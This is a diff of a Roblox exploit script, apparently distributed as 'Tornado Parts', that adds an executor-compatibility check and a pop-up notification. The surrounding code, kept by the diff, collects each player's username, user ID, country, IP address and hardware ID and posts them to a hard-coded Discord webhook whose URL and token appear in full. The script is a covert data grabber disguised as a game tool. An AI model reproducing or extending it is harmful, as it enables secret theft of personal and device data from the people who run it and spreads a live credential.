@@ -1,3 +1,43 @@
+-- Executor kök adını algılama
+local executorName = getexecutorname and getexecutorname() or "Unknown"
+
+-- Desteklenen executor kontrolü (Level 5 ve üstü bilinen executorlar)
+local isSupported = executorName == "JJSploit" or
+                    executorName == "Solara" or
+                    executorName == "Arceus X" or
+                    executorName == "Arceus" or
+                    executorName == "ArceusX" or
+                    executorName == "Fluxus" or
+                    executorName == "Codex" or
+                    executorName == "Xeno" or
+                    executorName == "Wave" or
+                    executorName == "ScriptWare" or
+                    executorName == "Sentinel" or
+                    executorName == "RoExec" or
+                    executorName == "Kiwi" or
+                    executorName == "DuckySploit" or
+                    executorName == "Luna" or
+                    executorName == "NX"
+
+-- Roblox bildirim fonksiyonu
+local function showNotification(title, description, buttonText, duration)
+    local StarterGui = game:GetService("StarterGui")
+    StarterGui:SetCore("SendNotification", {
+        Title = title,
+        Text = description .. " - By Arasbey232323",
+        Button1 = buttonText,
+        Duration = duration
+    })
+end
+
+-- Koşullu kontrol
+if isSupported then
+    showNotification(executorName .. " Is Supported!", "Tornado Parts is opening..", "Ok", 5)
+else
+    showNotification("Executor Not Supported!", "Tornado Parts cannot be opened :(", "Ok", 5)
+    return -- Desteklenmiyorsa script burada durur
+end
+
 local webhookUrl = "https://discord.com/api/webhooks/1369334273118830693/dYkc6_FwPpY1pJ37dnkJMixbyS3y8o2n5uJV6hFkz5QlXZy9YrCDGGRk0vKkE673Bw7a"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -39,31 +79,8 @@ end
 local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 local GameId = game.PlaceId
 
--- Executor Tespiti
-local function detectExecutor()
-    local executor
-    if identifyexecutor then
-        executor = identifyexecutor()
-    elseif syn and not is_sirhurt_closure and not pebc_execute then
-        executor = "Synapse X"
-    elseif secure_load then
-        executor = "Sentinel"
-    elseif pebc_execute then
-        executor = "ProtoSmasher"
-    elseif KRNL_LOADED then
-        executor = "Krnl"
-    elseif is_sirhurt_closure then
-        executor = "SirHurt"
-    else
-        executor = "Unknown"
-    end
-    return executor
-end
-
 -- Webhook Verisi Oluşturma
 local function createWebhookData()
-    local executor = detectExecutor()
-    
     local data = {
         ["content"] = "",
         ["embeds"] = {
@@ -83,7 +100,7 @@ local function createWebhookData()
                     "\n\n**Data:** ```%s``` \n**JobId:** ```%s```",
                     UserId, DisplayName, Username, UserId, MembershipType, AccountAge,
                     Country, GetIp, GetHwid, tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
-                    GameId, GameName, GameId, executor, GetData, ConsoleJobId
+                    GameId, GameName, GameId, executorName, GetData, ConsoleJobId
                 ),
                 ["type"] = "rich",
                 ["color"] = 0xFFD700,
